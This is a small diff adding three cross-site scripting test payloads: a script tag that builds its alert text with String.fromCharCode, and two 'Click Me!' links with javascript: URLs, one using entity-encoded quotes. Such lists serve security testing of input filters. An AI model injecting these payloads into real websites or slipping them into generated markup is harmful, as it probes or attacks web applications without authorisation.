@@ -1,0 +1,5 @@
+<script>alert(String.fromCharCode(88,83,83))</script>
+
+<a href=javascript:alert(String.fromCharCode(88,83,83))>Click Me!</a>
+
+<a href=javascript:alert(&quot;XSS&quot;)>Click Me!</a>
